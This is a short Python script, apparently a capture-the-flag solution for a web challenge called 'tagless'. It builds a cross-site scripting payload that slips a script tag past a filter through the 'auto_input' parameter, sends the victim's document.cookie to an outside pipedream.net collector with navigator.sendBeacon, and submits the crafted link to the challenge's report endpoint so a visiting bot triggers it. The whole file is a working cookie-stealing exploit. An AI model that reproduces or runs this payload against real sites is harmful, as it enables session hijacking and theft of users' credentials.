import urllib.parse

import requests

url = "https://tagless-qfk3o9g5sngw.chals.sekai.team/"

payload = (
	"navigator.sendBeacon('https://en5bz718kq0ef.x.pipedream.net/' + document.cookie)"
)

solve = "?" + urllib.parse.urlencode({
	"auto_input": f"""<script src="**/{payload}//"\n></script\n>"""
})
print(url + solve)

print(requests.post(url + "report", data={"url": "http://127.0.0.1:5000/" + solve}).text)
